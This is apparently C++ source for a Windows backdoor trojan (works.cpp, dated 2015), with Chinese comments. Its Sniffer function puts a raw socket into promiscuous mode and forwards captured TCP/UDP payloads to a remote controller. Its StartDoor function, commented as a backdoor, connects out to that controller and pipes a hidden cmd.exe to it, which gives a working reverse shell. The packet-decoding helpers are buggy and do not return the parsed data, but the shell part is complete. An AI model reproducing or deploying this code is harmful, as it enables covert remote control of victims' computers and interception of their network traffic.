//////////////////////////////////////////////////////////////
//author : superfish
//date : 2015/12/12
//name : works.cpp
//thanks : yunshu
//////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include "mstcpip.h"
#include "wint.h"
#pragma comment(lib, "ws2_32.lib")

extern isRunning;

//嗅探
int Sniffer(LPVOID argument)
{
	WSADATA wsaData;
	char FAR hostName[128] = {0}; //存放主机名
	struct hostent *phe; //存放IP地址结构
	char myIP[16] = {0};
	SOCKET sock, sockput;
	char recvBuffer[BUFFER_SIZE] = {0}; //存放捕获的数据
	SOCKADDR_IN sniff, sin;
	SHELL_ARGUMENT *shellArgument = (SHELL_ARGUMENT *)argument;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		printf("Sniffer: WSAStartup error: %d\n", GetLastError());
		return -1;
	}
	
	gethostname(hostName, 128); //获取主机名
	phe = gethostbyname(hostName); //获取本机ip地址结构
	if(phe == NULL){
		printf("Sniffer: GetHostName error: %d\n", GetLastError());
		return -1;
	}
	struct in_addr addr;
	int ipIndex;
	for(ipIndex = 0;phe->h_addr_list[ipIndex];ipIndex++){
		memcpy(&addr, phe->h_addr_list[ipIndex], 4);
		
		//优先绑定不是内网的IP地址
		if((strncmp(inet_ntoa(addr), "10.", 3) != 0) && (strncmp(inet_ntoa(addr), "172.", 4) != 0) && (strncmp(inet_ntoa(addr), "192.168.", 8) != 0)){
		    strcpy(myIP, inet_ntoa(addr));
		    break;
		}
	}
    //否则绑定第一个IP地址
    if(strlen(myIP) == 0){
		memcpy(&addr, phe->h_addr_list[0], 4);
		strcpy(myIP, inet_ntoa(addr));
	}
		
	#ifdef DEBUG
        LogToFile("Sniffer: Local IP is ");
        LogToFile(myIP);
        LogToFile("\n");
    #endif
	    
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP); //监听数据包的socket
	sockput = socket(AF_INET, SOCK_STREAM, 0); //发送数据的socket
	
	if(sock == INVALID_SOCKET || sockput == INVALID_SOCKET){
		printf("Sniffer: Sniffer socket error: %d\n", GetLastError());
		return -1;
	}
		
	#ifdef DEBUG
        LogToFile("Sniffer: Sniffer socket is ok now...\n");
    #endif
	
	//sock绑定到本地随机端口
	memset(&sniff, 0, sizeof(sniff));
	sniff.sin_family = AF_INET;
	sniff.sin_port = htons(0); 
	sniff.sin_addr.s_addr = inet_addr(myIP);
	bind(sock, (struct sockaddr *)&sniff, sizeof(sniff));
	
	//sockput连接到控制端
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(shellArgument->port));
	sin.sin_addr.s_addr = inet_addr(shellArgument->ip);		
	if(connect(sockput, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR){
		printf("Sniffer: Connect error: %d\n", GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
	    LogToFile("Sniffer: Sniffer bind is ok now...\n");
	#endif
	
	//设置SOCK_RAW为SIO_RCVALL(混杂模式)，以便接收所有的IP包
	DWORD dwBufferLen[10] = {0};
	DWORD dwBufferInLen = 1;
	DWORD dwBytesReturned = 0;
	WSAIoctl(sock, //套接字
	         SIO_RCVALL, //将进行操作的控制代码
	         &dwBufferInLen, //输入缓冲区的地址
			 sizeof(dwBufferInLen), //输入缓冲区的大小
			 &dwBufferLen, //输出缓冲区的地址
			 sizeof(dwBufferLen), //输出缓冲区的大小
			 &dwBytesReturned, //输出实际字节数的地址
			 NULL, //WSAOVERLAPPED结构的地址
			 NULL //一个指向操作结束后调用的例程指针
			 );
	
    #ifdef DEBUG
	    LogToFile("Sniffer: Begin to recv...\n");
	#endif
	
	int bytesRecived = 0;
	char decodeBuffer[BUFFER_SIZE] = {0}; //存放解析后的数据
	while(TRUE){
		if(!isRunning) break;
		memset(recvBuffer, 0, BUFFER_SIZE);
		
		//开始捕获数据包
		bytesRecived = recv(sock, recvBuffer, sizeof(recvBuffer)-40, 0);
		if(bytesRecived <= 0){
			#ifdef DEBUG
				LogToFile("Sniffer: recv nothing, break...\n");
			#endif
			
			break;
		}
		
		#ifdef DEBUG
			LogToFile("Sniffer: recv ok, decode...\n");
		#endif
				
		Decode(recvBuffer, decodeBuffer);
		if(decodeBuffer){
			send(sockput, decodeBuffer, strlen(decodeBuffer), 0);
		}
	}
	
	closesocket(sock);
	closesocket(sockput);
	WSACleanup();
	
	return 0;
}

//分析TCP和UDP数据包，得到应用层数据
void Decode(char *recvBuffer, char *decodeBuffer)
{
	IP_HEADER *ipHeader; //IP头指针
	ipHeader = (IP_HEADER *)recvBuffer;
	unsigned int hlen = (unsigned int)(((ipHeader->h_verlen)&15)*4);
	
	switch(ipHeader->proto)
	{
		case 6: //TCP
		DecodeTCP(recvBuffer+hlen, decodeBuffer);
		break;
		
		case 17: //UDP
		DecodeUDP(recvBuffer+hlen, decodeBuffer);
		break;

		default: break;
	}
	
	strcat(decodeBuffer, "\n++++++++++++++++++++++++++++++++++++++\n");
	return;
}

//分析TCP包
void DecodeTCP(char *buffer, char *decodeBuffer)
{
	TCP_HEADER *tcpHeader; //TCP头指针
	tcpHeader = (TCP_HEADER *)buffer;
	unsigned int hlen = (unsigned int)(((tcpHeader->th_lenres)>>4)&15); //TCP头部长度
	
	decodeBuffer = buffer + hlen;
	
	return;
}

//分析UDP包
void DecodeUDP(char *buffer, char *decodeBuffer)
{
	UDP_HEADER *udpHeader; //UDP头指针
	udpHeader = (UDP_HEADER *)buffer;
	unsigned int hlen = (unsigned int)8;
	
	decodeBuffer = buffer + hlen;
	
	return;
}

//后门
int StartDoor(LPVOID argument)
{
	SOCKET sock;
	SOCKADDR_IN sin;
	WSADATA wsaData;
	SHELL_ARGUMENT *shellArgument = (SHELL_ARGUMENT *)argument;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		printf("StartDoor: WSAStartup error: %d\n", GetLastError());
		return -1;
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock == INVALID_SOCKET){
		printf("StartDoor: Create socket error: %d\n", GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
        LogToFile("StartDoor: StartDoor socket is ok now...\n");
    #endif
	
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(shellArgument->port));
	sin.sin_addr.s_addr = inet_addr(shellArgument->ip);
	
	int ret;
	ret = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
	if(ret == SOCKET_ERROR){
		printf("StartDoor: Connect error: %d\n", GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
        LogToFile("StartDoor: StartDoor socket is connected now...\n");
    #endif
	
	SECURITY_ATTRIBUTES sa;
	
	sa.nLength = sizeof(sa); //结构的大小
	sa.lpSecurityDescriptor = 0; //安全描述符(默认)
	sa.bInheritHandle = TRUE; //是否可以被新创建的进程继承(可以)
	
	//创建进程间通信的管道
	HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;
	ret = CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
	ret = CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0);
	
	//该结构用于指定新进程的主窗口特性
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	GetStartupInfo(&si);
	
	si.cb = sizeof(si); //结构的大小
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES; //使用wShowWindow成员|使用hStdInput、hStdOutput和hStdError成员
	si.wShowWindow = SW_HIDE; //隐藏窗口
	si.hStdInput = hReadPipe2; //绑定新进程输入
	si.hStdOutput = si.hStdError = hWritePipe1; //绑定新进程输出
	
	PROCESS_INFORMATION processInfo; //进程有关信息
	
	char cmdLine[] = "cmd.exe";
	
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
	ret = CreateProcess(NULL, //可以是NULL
	                    cmdLine, //要执行的命令
						NULL, //返回的句柄是否可被子进程继承(否，新进程使用默认的安全描述符)
						NULL, //线程是否被继承，通常为NULL
						1, //指示新进程是否从调用进程处继承了句柄(是)
						0, //指定附加的、用来控制优先类和进程的创建的标志
						NULL, //指向一个新进程的环境块(使用调用进程的环境)
						NULL, //用来指定子进程的工作路径(使用与调用进程相同的驱动器和目录)
						&si,
						&processInfo);
	
	char buff[BUFFER_SIZE] = {0}; //从管道中读出数据的目标缓冲区
	unsigned long bytesRead = 0; //从管道中读出的字节数
	int i = 0;	
	while(TRUE){
		if(!isRunning) break;
		memset(buff, 0, BUFFER_SIZE);
		
		//套接字sock收到的数据写入pipe2里给cmd执行，执行的结果输出到pipe1里让sock发出去
		ret = PeekNamedPipe(hReadPipe1, buff, BUFFER_SIZE, &bytesRead, NULL, NULL);
		for(i = 0;i < 5 && bytesRead == 0;i++){
			Sleep(100);
			ret = PeekNamedPipe(hReadPipe1, buff, BUFFER_SIZE, &bytesRead, NULL, NULL);
		}
		if(bytesRead){
			ret = ReadFile(hReadPipe1, buff, bytesRead, &bytesRead, 0);
			if(!ret) break;
			ret = send(sock, buff, bytesRead, 0);
			if(ret <= 0) break;
		}else{
			bytesRead = recv(sock, buff, BUFFER_SIZE, 0);
			if(bytesRead <= 0) break;
			if(StartWith(buff, "exit")) break;
			ret = WriteFile(hWritePipe2, buff, bytesRead, &bytesRead, 0);
			if(!ret) break;
		}
	}
	
	TerminateProcess(processInfo.hProcess, 0);
	CloseHandle(hReadPipe1);
	CloseHandle(hReadPipe2);
	CloseHandle(hWritePipe1);
	CloseHandle(hWritePipe2);
	
	closesocket(sock);
	WSACleanup();
	
	return 0;
}

//判断buf1是否以buf2开头
BOOL StartWith(char *buf1, char *buf2)
{
	int len = strlen(buf2);
	if(!memcmp(buf1, buf2, len)){
		return TRUE;
	}else{
		return FALSE;
	}
}
